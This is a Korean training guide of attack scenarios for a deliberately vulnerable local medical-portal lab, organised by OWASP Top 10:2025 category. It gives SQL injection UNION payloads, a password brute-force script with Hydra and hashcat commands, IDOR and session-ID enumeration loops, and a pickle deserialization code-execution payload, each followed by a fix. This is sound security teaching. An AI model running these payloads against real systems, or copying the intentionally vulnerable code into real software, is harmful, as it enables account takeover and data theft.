# OWASP Top 10:2025 취약점 실습 공격 시나리오 가이드

> 대상 시스템: 공공 의료 민원 포털 (교육/실습용)
> 접속 URL: `http://localhost:8080`
> 분류 기준: 이 프로젝트의 OWASP Top 10:2025 카탈로그 (`security_catalog.py`)

---

## 사전 준비

### 앱 실행

```bash
# Docker (권장)
docker compose up --build

# 로컬 직접 실행
cd was
flask --app manage.py init-db
flask --app manage.py seed-demo
python manage.py
```

### 기본 계정

| 계정 | 아이디 | 비밀번호 |
|------|--------|----------|
| 관리자 | `admin` | `admin1234` |
| 일반 사용자 1 | `user1` | `user12345` |
| 일반 사용자 2 | `user2` | `user12345` |

### 필요 도구

| 도구 | 용도 |
|------|------|
| Burp Suite Community | 패킷 캡처 및 요청 조작 |
| FoxyProxy (Firefox 확장) | 브라우저 프록시 설정 |
| curl | CLI HTTP 요청 |
| Python 3 | 자동화 스크립트 실행 |

---

## 전체 시나리오 목록

| OWASP | 제목 | 실습 시나리오 | 실습 URL |
|-------|------|---------------|----------|
| A01 | Broken Access Control | 파일 다운로드 IDOR | `/vulnlab/crypto3` |
| A01 | Broken Access Control | 인증 체크 누락 – 사용자 목록 무단 접근 | `/vulnlab/auth3/user-list` |
| A02 | Security Misconfiguration | 기본 계정 + SECRET_KEY 노출 + 상세 에러 | `/vulnlab/a02` |
| A03 | Software Supply Chain Failures | 버전 미고정 패키지 취약점 스캔 | `/vulnlab/a03` |
| A04 | Cryptographic Failures | HTTP 전송 구간 평문 노출 | `/complaints/new` + Burp |
| A04+A05 | Cryptographic Failures + Injection | MD5 비밀번호 + SQL Injection 탈취 | `/vulnlab/crypto2` |
| A05 | Injection | SQL Injection – 전체 사용자 조회 | `/vulnlab/a05` |
| A06 | Insecure Design | Rate Limiting 부재 + 상태 전이 무검증 | `/vulnlab/a06` |
| A07 | Authentication Failures | RockYou.txt 브루트포스 – 계정 잠금 없음 | `/login` |
| A07 | Authentication Failures | 순차 세션 ID 추측 공격 | `/vulnlab/auth2` |
| A08 | Software or Data Integrity Failures | Pickle 역직렬화 – 임의 코드 실행 | `/vulnlab/a08` |
| A09 | Security Logging and Alerting Failures | 평문 비밀번호 로깅 + 알림 부재 | `/vulnlab/a09` |
| A10 | Mishandling of Exceptional Conditions | Fail-Open + 상세 Traceback 노출 | `/vulnlab/a10` |

---

## A01:2025 – Broken Access Control

> 사용자 권한 경계가 무너져 인가되지 않은 리소스에 접근하는 취약점

---

### 시나리오 A01-1: 의료 리포트 파일 다운로드 IDOR

**실습 URL:** `http://localhost:8080/vulnlab/crypto3`

#### 취약점 개요

다운로드 URL에 환자 이름·생년월일이 파일명으로 노출되고,
서버가 요청자와 파일 소유자를 비교하지 않아 파일명만 바꾸면
다른 환자의 진료 기록을 내려받을 수 있습니다.

```
취약한 URL 설계:
GET /download?file_name=진료기록_홍길동_900101.pdf   ← 개인정보 노출
GET /download?file_name=진료기록_김철수_850315.pdf   ← 파일명만 바꾸면 타인 기록 접근
```

#### 공격 절차

**Step 1 – 실습 페이지 접속**

1. `user1 / user12345`로 로그인
2. `http://localhost:8080/vulnlab/crypto3` 접속
3. **내 파일 다운로드 (정상)** 버튼 클릭 후 URL 확인

```
/vulnlab/crypto3/download?file_name=진료기록_홍길동_900101.pdf
```

**Step 2 – URL 파일명 직접 변조**

주소창에서 `file_name` 값을 아래로 교체:

```
http://localhost:8080/vulnlab/crypto3/download?file_name=진료기록_김철수_850315.pdf
http://localhost:8080/vulnlab/crypto3/download?file_name=민원결과_박민준_880503.pdf
```

**Step 3 – Burp Intruder로 파일 목록 자동 열거**

1. Burp Proxy에서 다운로드 요청 포착 → **Send to Intruder**
2. Positions 탭 → 파일명 부분 `§진료기록_홍길동_900101.pdf§` 선택
3. Payloads 탭 → Simple list → 아래 4개 입력

```
진료기록_홍길동_900101.pdf
진료기록_김철수_850315.pdf
진료기록_이영희_920720.pdf
민원결과_박민준_880503.pdf
```

4. **Start Attack** → 전체 `200 OK` 확인

#### 결과 확인

| 파일명 | 노출 정보 |
|--------|-----------|
| `진료기록_홍길동_900101.pdf` | 주민번호 900101-1234567, 고혈압 처방 |
| `진료기록_김철수_850315.pdf` | 주민번호 850315-1987654, 당뇨 처방 |
| `진료기록_이영희_920720.pdf` | 주민번호 920720-2345678, 디스크 처방 |
| `민원결과_박민준_880503.pdf` | 주민번호 880503-1567890, 환급 금액 |

#### 대응 방안

```python
# ❌ 취약: 파일명 노출 + 소유권 체크 없음
@app.route("/download")
@login_required
def download():
    name = request.args.get("file_name")
    return send_file(f"./reports/{name}")  # 소유권 체크 없음!

# ✅ 안전: UUID 식별자 + 소유권 검증
@app.route("/download/<uuid:file_id>")
@login_required
def download(file_id):
    record = FileRecord.query.get_or_404(file_id)
    if record.owner_id != current_user.id:
        abort(403)
    return send_file(record.stored_path, download_name=record.display_name)
```

---

### 시나리오 A01-2: 인증 체크 누락 – 사용자 목록 무단 접근

**실습 URL:** `http://localhost:8080/vulnlab/auth3/user-list`

#### 취약점 개요

`@login_required` 데코레이터가 누락된 관리자 페이지에
로그인하지 않은 공격자가 URL을 직접 입력하면
전체 사용자의 이름, 이메일, 전화번호, 역할이 노출됩니다.

```python
# 현재 코드 (취약)
@app.route("/vulnlab/auth3/user-list")
# @login_required  ← 고의 누락
def admin_user_list():
    users = User.query.all()
    return render_template("users.html", users=users)
```

#### 공격 절차

**Step 1 – 로그아웃 상태로 직접 URL 접속**

```
http://localhost:8080/logout
```

로그아웃 후 주소창에:

```
http://localhost:8080/vulnlab/auth3/user-list
```

로그인 페이지로 이동하지 않고 전체 사용자 목록이 표시되면 확인 완료.

**Step 2 – curl로 비인증 접근 확인**

```bash
curl -s http://localhost:8080/vulnlab/auth3/user-list \
  | grep -E "username|email|phone"
```

**Step 3 – 보호된 엔드포인트와 비교**

```python
# unauth_scan.py
import requests

BASE  = "http://localhost:8080"
PATHS = [
    "/vulnlab/auth3/user-list",
    "/admin",
    "/admin/users",
    "/complaints",
    "/profile",
]

s = requests.Session()
for path in PATHS:
    r = s.get(f"{BASE}{path}", allow_redirects=False)
    status = "⚠ 접근 가능 (취약)" if r.status_code == 200 \
             else f"→ {r.headers.get('Location', r.status_code)}"
    print(f"GET {path:<40} {status}")
```

예상 출력:

```
GET /vulnlab/auth3/user-list             ⚠ 접근 가능 (취약)
GET /admin                               → /login?next=%2Fadmin
GET /admin/users                         → /login?next=%2Fadmin%2Fusers
GET /complaints                          → /login?next=%2Fcomplaints
```

#### 대응 방안

```python
# ✅ 모든 민감 라우트에 인증 + 권한 데코레이터 적용
@app.route("/admin/user-list")
@login_required
@admin_required
def admin_user_list():
    users = User.query.all()
    return render_template("admin/users.html", users=users)
```

---

## A02:2025 – Security Misconfiguration

> 잘못된 기본 설정과 운영 설정 누락으로 시스템 내부 정보가 노출되는 취약점

**실습 URL:** `http://localhost:8080/vulnlab/a02`

---

### 시나리오 A02-1: 기본 계정 + SECRET_KEY 노출 + 상세 에러 메시지

#### 취약점 개요

1. 초기 관리자 계정이 `admin / admin1234`로 변경되지 않아 기본값으로 로그인 가능
2. Flask `SECRET_KEY`가 기본값으로 하드코딩되어 화면에 노출됨
3. 예외 발생 시 상세 Traceback이 사용자에게 노출됨

#### 공격 절차

**Step 1 – 기본 계정으로 관리자 로그인**

1. `http://localhost:8080/login` 접속
2. 아이디: `admin`, 비밀번호: `admin1234` 입력
3. 관리자 대시보드 접근 성공 확인

브라우저 주소창에서 관리자 전용 페이지 직접 접근:

```
http://localhost:8080/admin
http://localhost:8080/admin/users
http://localhost:8080/admin/logs
```

**Step 2 – SECRET_KEY 및 설정 정보 노출 확인**

1. `user1`으로 로그인
2. `http://localhost:8080/vulnlab/a02` 접속
3. 화면에서 노출되는 정보 확인:

```
SECRET_KEY   : dev-secret          ← 기본값 하드코딩
DEBUG        : True                ← 운영 환경에서도 켜짐
DATABASE_URL : sqlite:///...       ← DB 경로 노출
```

**Step 3 – 상세 에러 메시지 노출 확인**

주소창에 `?trigger_error=1` 추가:

```
http://localhost:8080/vulnlab/a02?trigger_error=1
```

화면에 표시되는 내용:

```
Traceback (most recent call last):
  File "/app/routes.py", line 1487, in vulnlab_a02
    _ = 1 / 0
ZeroDivisionError: division by zero
```

내부 파일 경로, 코드 구조가 그대로 노출됨.

**Step 4 – HTTP 응답 헤더에서 서버 정보 확인**

```bash
curl -sI http://localhost:8080/ | grep -iE "server|x-powered"
```

#### 대응 방안

```python
# ❌ 취약: 기본값 하드코딩
SECRET_KEY = "dev-secret"
DEBUG = True

# ✅ 안전: 환경 변수 주입
import os
SECRET_KEY = os.environ["SECRET_KEY"]   # 운영에서 강력한 랜덤값
DEBUG = os.environ.get("FLASK_ENV") != "production"

# ✅ 안전: 표준 에러 페이지 (Traceback 미노출)
@app.errorhandler(500)
def server_error(e):
    app.logger.error(e)               # 서버 로그에만 기록
    return render_template("errors/500.html"), 500
```

---

## A03:2025 – Software Supply Chain Failures

> 소프트웨어 의존성 관리 부실로 취약한 패키지가 시스템에 포함되는 취약점

**실습 URL:** `http://localhost:8080/vulnlab/a03`

---

### 시나리오 A03-1: 버전 미고정 패키지 취약점 확인

#### 취약점 개요

`requirements.txt`에 버전이 고정되지 않은 패키지는 `pip install` 실행 시점에
따라 취약한 버전이 설치될 수 있으며, 알려진 CVE가 존재할 수 있습니다.

#### 공격 절차

**Step 1 – 버전 고정 현황 확인**

1. `user1`으로 로그인
2. `http://localhost:8080/vulnlab/a03` 접속
3. `requirements.txt` 분석 결과 확인:

```
flask==3.0.3        ← 버전 고정 ✅
requests            ← 버전 미고정 ⚠
sqlalchemy          ← 버전 미고정 ⚠
```

**Step 2 – 설치된 패키지 목록 확인**

실습 페이지 하단의 `pip list` 출력에서 설치된 실제 버전 확인.

**Step 3 – 로컬에서 취약점 스캔 (권장 도구)**

```bash
# pip-audit: PyPI Advisory Database 기반 취약점 스캔
pip install pip-audit
pip-audit -r was/requirements.txt

# 예상 출력 형식:
# Name         Version  ID             Fix Versions
# ------------ -------- -------------- ------------
# werkzeug     2.3.0    GHSA-2g68-...  3.0.3
```

```bash
# safety: Snyk DB 기반 스캔
pip install safety
safety check -r was/requirements.txt
```

**Step 4 – Docker 이미지 취약점 스캔 (참고)**

```bash
# Trivy로 컨테이너 이미지 스캔
docker pull aquasec/trivy
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image pjt2-was:latest
```

#### 대응 방안

```
# ❌ 취약: 버전 미고정
flask
requests
sqlalchemy

# ✅ 안전: 버전 고정 + pip-audit CI 통합
flask==3.0.3
requests==2.32.3
sqlalchemy==2.0.30

# Makefile 또는 CI에 추가
audit:
    pip-audit -r requirements.txt
    safety check -r requirements.txt
```

---

## A04:2025 – Cryptographic Failures

> 암호화 누락 또는 취약한 알고리즘 사용으로 민감 데이터가 노출되는 취약점

---

### 시나리오 A04-1: 전송 구간 암호화 누락 (HTTP Plaintext 노출)

**실습 URL:** `http://localhost:8080/complaints/new` + Burp Suite

#### 취약점 개요

Nginx가 HTTP(80포트)만 서비스하고 HTTPS가 없어,
환자가 민원에 입력하는 이름·주민번호·증상이 네트워크 구간에서 평문으로 노출됩니다.

```nginx
# web/nginx.conf (현재 취약)
server {
    listen 80;      # HTTPS 없음
    location / { proxy_pass http://was:8000; }
}
```

#### 공격 절차

**Step 1 – Burp Suite 프록시 설정**

1. Burp Suite 실행 → Proxy → Options → 리스너 `127.0.0.1:8080` 확인
2. Firefox → 설정 → 수동 프록시 → HTTP: `127.0.0.1`, 포트: `8080`

**Step 2 – Intercept ON 상태에서 민원 제출**

1. `user1 / user12345`로 로그인
2. 민원 → 민원 신청 (`/complaints/new`) 접속
3. Burp **Intercept: ON** 활성화
4. 폼 작성:

| 필드 | 입력값 |
|------|--------|
| 제목 | 진료비 과다청구 이의제기 |
| 내용 | 홍길동, 주민번호 900101-1234567, 고혈압 진단 청구 과다 |
| 카테고리 | 보험/진료비 |

5. **민원 제출** 클릭

**Step 3 – 평문 패킷 확인**

Burp Intercept 탭에서 포착된 내용:

```http
POST /complaints/new HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

title=진료비+과다청구&content=홍길동%2C+주민번호+900101-1234567...&category=billing
```

URL 디코딩 후 원문 그대로 노출됨.

**Step 4 – 요청 저장**

Intercept 우클릭 → **Send to Repeater** 로 재현용 저장

#### 대응 방안

```nginx
# ✅ 안전한 nginx.conf
server {
    listen 80;
    return 301 https://$host$request_uri;
}
server {
    listen 443 ssl;
    ssl_certificate     /etc/ssl/certs/site.crt;
    ssl_certificate_key /etc/ssl/private/site.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;
    add_header Strict-Transport-Security "max-age=31536000" always;
}
```

---

### 시나리오 A04-2: 취약한 해시 알고리즘 (MD5) + SQL Injection 연계

**실습 URL:** `http://localhost:8080/vulnlab/crypto2`

#### 취약점 개요

비밀번호를 MD5로 저장하면 SQL Injection으로 해시를 탈취한 뒤
온라인 레인보우 테이블에서 수초 내 원문이 복원됩니다.

#### 공격 절차

**Step 1 – MD5 해시 현황 확인**

1. `user1`으로 로그인 후 `http://localhost:8080/vulnlab/crypto2` 접속
2. 화면의 MD5 데모 사용자 테이블 확인:

```
admin_demo  →  0192023a7bbd73250516f069df18b500  (원문: admin1234)
user1_demo  →  a9af47aba5d87a79bb9ce7dfc11e70f5  (원문: user12345)
```

**Step 2 – UNION SELECT로 전체 사용자 해시 덤프**

검색란에 입력:

```sql
' UNION SELECT id,username,password_hash,email,role FROM user --
```

**Step 3 – 온라인 MD5 크래킹**

1. 탈취된 MD5 해시 복사
2. [CrackStation.net](https://crackstation.net) 접속 → 붙여넣기 → Crack Hashes
3. 수초 내 원문 확인

**Step 4 – Hashcat 오프라인 크래킹 (참고용)**

```bash
echo "0192023a7bbd73250516f069df18b500" > hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### 대응 방안

```python
# ❌ 취약: MD5 / SHA1
pw_hash = hashlib.md5(password.encode()).hexdigest()
pw_hash = hashlib.sha1(password.encode()).hexdigest()

# ✅ 안전: PBKDF2-SHA256 + 랜덤 salt 자동 포함
from werkzeug.security import generate_password_hash
pw_hash = generate_password_hash(password)
# 결과: pbkdf2:sha256:600000$<salt>$<hash>
```

---

## A05:2025 – Injection

> 신뢰할 수 없는 데이터가 쿼리에 삽입되어 의도치 않은 동작을 유발하는 취약점

**실습 URL:** `http://localhost:8080/vulnlab/a05`

---

### 시나리오 A05-1: SQL Injection – 전체 사용자 조회 및 해시 탈취

#### 취약점 개요

검색 파라미터를 f-string으로 직접 쿼리에 삽입해 SQL Injection이 가능합니다.

```python
# 취약한 코드
vuln_sql = f"SELECT id,username,email,role FROM user WHERE username LIKE '%{search}%'"
```

#### 공격 절차

**Step 1 – 기본 동작 확인**

`http://localhost:8080/vulnlab/a05` 접속 후 검색창에 `user` 입력 → 일반 결과 확인.

**Step 2 – 전체 사용자 조회 (WHERE 조건 무력화)**

```sql
' OR '1'='1
```

모든 사용자가 조회됨. 취약한 쿼리 결과와 안전한 쿼리 결과의 차이를 비교.

**Step 3 – UNION SELECT로 비밀번호 해시 탈취**

```sql
' UNION SELECT id,username,password_hash,email,role FROM user --
```

결과: `password_hash` 컬럼에 비밀번호 해시 노출.

**Step 4 – Burp Repeater로 반복 테스트**

1. Burp Proxy에서 GET 요청 포착 → **Send to Repeater**
2. URL의 `q=` 파라미터 값을 아래로 변경하며 전송:

```
q=' OR '1'='1
q=' UNION SELECT 1,username,password_hash,email,role FROM user --
q=' UNION SELECT 1,2,3,4,5 --    (컬럼 수 확인용)
```

#### 대응 방안

```python
# ❌ 취약: f-string 직접 삽입
sql = f"SELECT ... WHERE username LIKE '%{search}%'"

# ✅ 안전: 파라미터 바인딩
sql  = "SELECT ... WHERE username LIKE :s"
rows = db.session.execute(text(sql), {"s": f"%{search}%"}).fetchall()

# ✅ 더 안전: ORM 사용
users = User.query.filter(User.username.ilike(f"%{search}%")).all()
```

---

## A06:2025 – Insecure Design

> 설계 단계에서 보안 요구사항이 누락되어 악용 가능한 취약점

**실습 URL:** `http://localhost:8080/vulnlab/a06`

---

### 시나리오 A06-1: Rate Limiting 부재 + 민원 상태 전이 무검증

#### 취약점 개요

1. **Rate Limiting 없음**: 같은 요청을 무제한 반복 전송 가능 → 서비스 남용
2. **상태 전이 검증 없음**: `received → resolved`처럼 단계를 건너뛰는 직접 변경 가능

#### 공격 절차

**Step 1 – Rate Limiting 부재 확인**

1. `user1`으로 로그인 후 `http://localhost:8080/vulnlab/a06` 접속
2. **요청 전송 (취약 – 잠금 없음)** 버튼을 빠르게 10회 이상 클릭
3. 60초 내 요청 횟수 카운터가 증가할 뿐 차단되지 않음 확인

```bash
# curl로 연속 요청 50회 전송
for i in $(seq 1 50); do
  curl -s -b "session=<세션_쿠키>" \
    -X POST http://localhost:8080/vulnlab/a06 \
    -d "action=request" -o /dev/null
done
echo "50회 요청 완료 – 차단 없음"
```

**Step 2 – 민원 상태 전이 무검증 확인**

정상 흐름: `received → in_review → resolved 또는 rejected`

실습 페이지에서:

1. 민원을 하나 선택
2. 현재 상태가 `received`인 민원을 즉시 `resolved`로 변경
3. 중간 단계 (`in_review`) 없이 바로 상태가 변경됨 확인

#### 대응 방안

```python
# ✅ Rate Limiting
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route("/api/submit")
@limiter.limit("10 per minute")
def submit(): ...

# ✅ 상태 전이 검증
VALID_TRANSITIONS = {
    "received":  ["in_review"],
    "in_review": ["resolved", "rejected"],
}

def update_complaint_status(complaint, new_status):
    allowed = VALID_TRANSITIONS.get(complaint.status, [])
    if new_status not in allowed:
        abort(400, f"'{complaint.status}' → '{new_status}' 전이 불가")
    complaint.status = new_status
```

---

## A07:2025 – Authentication Failures

> 신원 확인 절차의 결함으로 계정 탈취나 인증 우회가 가능한 취약점

---

### 시나리오 A07-1: RockYou.txt 브루트포스 – 계정 잠금 없음

**실습 URL:** `http://localhost:8080/login`

#### 취약점 개요

로그인 실패 횟수 제한, 지연, 계정 잠금이 없어
`admin` 계정에 rockyou.txt를 대입하면 비밀번호 `admin1234`를 발견합니다.

#### 공격 절차

**Step 1 – 취약점 수동 확인**

`http://localhost:8080/login`에서 틀린 비밀번호를 10회 이상 입력:

- 잠금 메시지 없음 / CAPTCHA 없음 / 응답 지연 없음 → 무제한 시도 가능

**Step 2 – Python 브루트포스 스크립트**

```python
# brute_force.py
import requests

TARGET   = "http://localhost:8080"
USERNAME = "admin"

# rockyou.txt 상위 항목 (실습용)
# 실전: open("/usr/share/wordlists/rockyou.txt", encoding="latin-1")
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "dragon", "123123",
    "iloveyou", "master", "hello", "shadow", "sunshine",
    "admin", "admin123", "admin1234", "password1", "pass123",
    "hospital", "medical", "doctor", "nurse", "patient",
]

s = requests.Session()
s.get(f"{TARGET}/login")

print(f"[*] 타겟: {USERNAME}  사전: {len(PASSWORDS)}개\n")

for i, pw in enumerate(PASSWORDS, 1):
    r = s.post(f"{TARGET}/login",
               data={"username": USERNAME, "password": pw},
               allow_redirects=True)
    success = "/login" not in r.url or "로그아웃" in r.text
    print(f"[{i:3d}] {pw:<20}  {'✓ 성공!' if success else '✗'}")
    if success:
        print(f"\n[+] 발견: {pw}  /  현재 URL: {r.url}")
        break
```

```bash
python3 brute_force.py
```

예상 출력:

```
[*] 타겟: admin  사전: 25개

[  1] 123456               ✗
...
[ 18] admin1234            ✓ 성공!

[+] 발견: admin1234  /  현재 URL: http://localhost:8090/
```

**Step 3 – Burp Suite Intruder로 대입**

1. `POST /login` 요청 포착 → **Send to Intruder**
2. Positions 탭 → `password=§admin1234§` 값 부분 선택
3. Payloads 탭 → Simple list → rockyou.txt 업로드
4. Options → Grep Match → `로그아웃` 추가 (성공 판별)
5. **Start Attack** → Grep 또는 Length 열에서 성공 요청 식별

**Step 4 – Hydra (Linux 환경)**

```bash
hydra -l admin \
      -P /usr/share/wordlists/rockyou.txt \
      localhost \
      http-post-form "/login:username=^USER^&password=^PASS^:로그인에 실패" \
      -V -f -t 4
```

#### 대응 방안

```python
from flask_limiter import Limiter

limiter  = Limiter(app, key_func=lambda: request.remote_addr)
_failed  = {}   # {username: int}

@app.route("/login", methods=["POST"])
@limiter.limit("10 per minute")
def login():
    username = request.form["username"]
    if _failed.get(username, 0) >= 5:
        flash("계정이 잠겼습니다. 5분 후 다시 시도하세요.", "danger")
        return render_template("login.html"), 429
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(request.form["password"]):
        _failed[username] = 0
        login_user(user)
        return redirect(url_for("index"))
    _failed[username] = _failed.get(username, 0) + 1
    return render_template("login.html"), 401
```

---

### 시나리오 A07-2: 순차 세션 ID 추측 공격

**실습 URL:** `http://localhost:8080/vulnlab/auth2`

#### 취약점 개요

세션 ID가 `1`, `2`, `3`처럼 순차 정수로 발급되면
공격자가 자신의 ID에서 ±1을 변경하는 것만으로
로그인 없이 타인의 세션에 접근할 수 있습니다.

```
정상: 로그인 → Set-Cookie: session_id=10
공격: session_id=9, 11, 12... 로 변경 → 타인 민원 내역 접근
```

#### 공격 절차

**Step 1 – 피해자 세션 발급 확인**

1. `http://localhost:8080/vulnlab/auth2` 접속
2. 사용자명 `nurse_kim` 입력 → **취약 로그인** → 발급 ID 확인 (`session_id=1`)
3. 사용자명 `admin_demo` 입력 → **취약 로그인** → 발급 ID 확인 (`session_id=2`)

**Step 2 – 세션 ID 추측으로 타인 계정 열람**

로그인하지 않은 상태에서 주소창에 입력:

```
http://localhost:8080/vulnlab/auth2/profile?session_id=1
http://localhost:8080/vulnlab/auth2/profile?session_id=2
```

**Step 3 – Burp Intruder로 범위 열거**

1. `GET /vulnlab/auth2/profile?session_id=1` 포착 → **Send to Intruder**
2. Positions 탭 → `session_id=§1§` 숫자 선택
3. Payloads 탭 → Numbers: From `1`, To `20`, Step `1`
4. **Start Attack** → 각 ID의 사용자 정보 수집

**Step 4 – curl 자동 열거**

```bash
for i in $(seq 1 10); do
  echo -n "session_id=$i : "
  curl -s "http://localhost:8080/vulnlab/auth2/profile?session_id=$i" \
    | grep -o '세션 탈취 성공.*' | head -1
done
```

#### 대응 방안

```python
import secrets, os

# ❌ 취약: 순차 정수
session_id = counter  # 1, 2, 3...

# ✅ 안전: 256bit 암호학적 난수
session_token = secrets.token_urlsafe(32)

# Flask 기본 세션 보안 설정
app.config["SECRET_KEY"]             = os.environ["SECRET_KEY"]
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SECURE"]   = True
app.config["SESSION_COOKIE_SAMESITE"] = "Strict"
```

---

## A08:2025 – Software or Data Integrity Failures

> 코드·데이터 무결성 검증 부족으로 악의적인 데이터가 실행되는 취약점

**실습 URL:** `http://localhost:8080/vulnlab/a08`

---

### 시나리오 A08-1: Pickle 역직렬화를 통한 임의 코드 실행

#### 취약점 개요

신뢰할 수 없는 입력을 `pickle.loads()`로 역직렬화하면
공격자가 만든 페이로드가 서버에서 임의 코드를 실행합니다.

```python
# 취약한 코드
data = request.form.get("payload")
obj  = pickle.loads(base64.b64decode(data))  # 임의 코드 실행!
```

#### 공격 절차

**Step 1 – 안전한 데모 페이로드 생성**

1. `http://localhost:8080/vulnlab/a08` 접속
2. **안전한 페이로드 생성** 버튼 클릭
3. 생성된 Base64 Pickle 페이로드 복사

```
gASVQAAAAAAAAACMCF9fbWFpbl9flIwMX1NhZmVEZW1vT2JqlJOUKYGUfZQojARuYW1llIwO...
```

**Step 2 – 취약한 Pickle 역직렬화 실행**

복사한 페이로드를 **취약 역직렬화** 폼에 붙여넣기 후 제출.

결과: 서버에서 pickle이 실행되어 객체 내용이 응답으로 반환됨.

**Step 3 – 원리 이해: 악성 Pickle 페이로드 구조 (설명용)**

```python
# 공격자가 만드는 악성 페이로드 (개념 설명)
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        # 서버에서 실행될 명령
        return (os.system, ("id > /tmp/pwned",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# → 이 payload를 폼에 제출하면 서버에서 'id' 명령이 실행됨
```

**Step 4 – 안전한 JSON 역직렬화와 비교**

**안전한 JSON 역직렬화** 폼에 입력:

```json
{"name": "테스트", "value": 42}
```

JSON은 데이터만 파싱하며 코드를 실행하지 않음 확인.

#### 대응 방안

```python
# ❌ 취약: pickle (임의 코드 실행 가능)
obj = pickle.loads(base64.b64decode(user_input))

# ✅ 안전: JSON (코드 실행 불가)
obj = json.loads(user_input)

# ✅ 안전: 서명된 데이터만 역직렬화 허용
from itsdangerous import URLSafeSerializer
s   = URLSafeSerializer(app.config["SECRET_KEY"])
obj = s.loads(user_input)  # 서명 검증 실패 시 예외 발생
```

---

## A09:2025 – Security Logging and Alerting Failures

> 공격 탐지·추적·알림이 불가능하도록 로그가 부실하거나 민감 정보가 평문 기록되는 취약점

**실습 URL:** `http://localhost:8080/vulnlab/a09`

---

### 시나리오 A09-1: 평문 비밀번호 로깅 + 로그인 실패 알림 부재

#### 취약점 개요

1. 로그에 비밀번호가 평문으로 기록됨 → 로그 파일 탈취 시 즉시 노출
2. 로그인 실패가 수백 번 발생해도 알림이 없음 → 브루트포스 탐지 불가

#### 공격 절차

**Step 1 – 평문 비밀번호 로그 생성 및 비교**

1. `user1`으로 로그인 후 `http://localhost:8080/vulnlab/a09` 접속
2. 가상 비밀번호 `mypassword123` 입력 후 **로그 기록** 클릭
3. 화면에서 두 로그 비교:

```
❌ 취약한 로그: {"event":"login","user":"user1","password":"mypassword123"}
✅ 안전한 로그: {"event":"login","user":"user1","password":"****"}
```

4. 화면 하단 **현재 사용자 감사 로그** 테이블에서 `vulnlab_sensitive_log` 항목 확인:
   - `meta` 컬럼에 `password_plaintext: mypassword123`이 그대로 저장된 것 확인

**Step 2 – 로그인 실패 알림 부재 확인**

실습 페이지에서 **누적 로그인 실패 수** 확인:

- 알림 발송: 없음
- 임계치 탐지: 없음
- 보안 대시보드 연동: 없음

**Step 3 – 감사 로그 직접 조회 (관리자 로그인 필요)**

```
http://localhost:8080/admin/logs
```

필터에서 `login_failed` 이벤트 검색 → 브루트포스 시도가 기록되지 않거나 알림 없음 확인.

#### 대응 방안

```python
# ❌ 취약: 평문 비밀번호 로깅
log.info(f"Login: {username}:{password}")

# ✅ 안전: 비밀번호 제외, 민감 필드 마스킹
log.info(f"Login attempt: user={username} ip={request.remote_addr}")

# ✅ 안전: 실패 횟수 누적 + 임계치 알림
_fail_count = {}

def record_failure(username, ip):
    key = f"{username}:{ip}"
    _fail_count[key] = _fail_count.get(key, 0) + 1
    if _fail_count[key] >= 10:
        send_security_alert(
            subject="브루트포스 탐지",
            body=f"{username} 계정 {_fail_count[key]}회 실패 from {ip}"
        )
```

---

## A10:2025 – Mishandling of Exceptional Conditions

> 비정상 상황에서 Fail-Open 동작, 상세 오류 노출 등 부적절한 예외 처리

**실습 URL:** `http://localhost:8080/vulnlab/a10`

---

### 시나리오 A10-1: Fail-Open 설계 + 상세 Traceback 노출

#### 취약점 개요

1. **Fail-Open**: `admin_required` 데코레이터의 권한 체크가 주석 처리되어
   예외 또는 실패 상황에서 접근이 **허용됨** (거부되어야 함)
2. **Traceback 노출**: 예외 발생 시 내부 코드 경로와 변수가 그대로 화면에 출력됨

```python
# 현재 코드 (Fail-Open)
def admin_required(func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        # if not current_user.role == "admin":  ← 주석 처리됨!
        #     return redirect(url_for("index"))
        return func(*args, **kwargs)  # 항상 허용!
    return wrapped
```

#### 공격 절차

**Step 1 – Fail-Open 확인 (admin_required 비활성)**

1. `user1`으로 로그인 (일반 사용자)
2. `http://localhost:8080/vulnlab/a10` 접속
3. **`/admin` 접근 (Fail-Open 확인)** 버튼 클릭
4. 관리자 대시보드가 표시됨 → 일반 사용자가 관리자 페이지 접근 성공 확인

또는 주소창에 직접 입력:

```
http://localhost:8080/admin
http://localhost:8080/admin/users
http://localhost:8080/admin/logs
```

**Step 2 – 예외 상세 정보 노출 확인**

**100 ÷** 입력란에 `0` 입력 후 **계산** 클릭:

```
❌ 취약한 응답:
Traceback (most recent call last):
  File "/app/routes.py", line 1751, in vulnlab_a10
    result = 100 / divisor
ZeroDivisionError: division by zero

✅ 안전한 응답:
오류: 0으로 나눌 수 없습니다.
```

또는 숫자 대신 문자열 `abc` 입력:

```
❌ 취약한 응답:
ValueError: invalid literal for int() with base 10: 'abc'
```

**Step 3 – NULL 입력 처리 확인**

입력란을 비운 채 제출:

```
❌ 취약한 응답: AttributeError: 'NoneType' object has no attribute 'upper'
✅ 안전한 응답: 입력값이 없습니다.
```

#### 대응 방안

```python
# ✅ Fail-Closed: 예외 시 접근 거부
def admin_required(func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != "admin":
            flash("관리자만 접근 가능합니다.", "danger")
            return redirect(url_for("index"))
        return func(*args, **kwargs)
    return wrapped

# ✅ 안전한 예외 처리: 사용자에게는 일반 메시지만
try:
    result = 100 / int(divisor_str)
except ZeroDivisionError:
    flash("오류: 0으로 나눌 수 없습니다.", "danger")
    return render_template("form.html")
except ValueError:
    flash("오류: 숫자를 입력해주세요.", "danger")
    return render_template("form.html")
```

---

## 권장 실습 순서

```
1.  앱 실행: docker compose up --build
2.  A01-2: 로그아웃 → /vulnlab/auth3/user-list 직접 접속
3.  A10-1: /vulnlab/a10 → Fail-Open + Traceback 노출 확인
4.  A02-1: /vulnlab/a02 → SECRET_KEY 노출 + 에러 메시지 확인
5.  A07-2: /vulnlab/auth2 → 순차 세션 발급 → 세션 추측
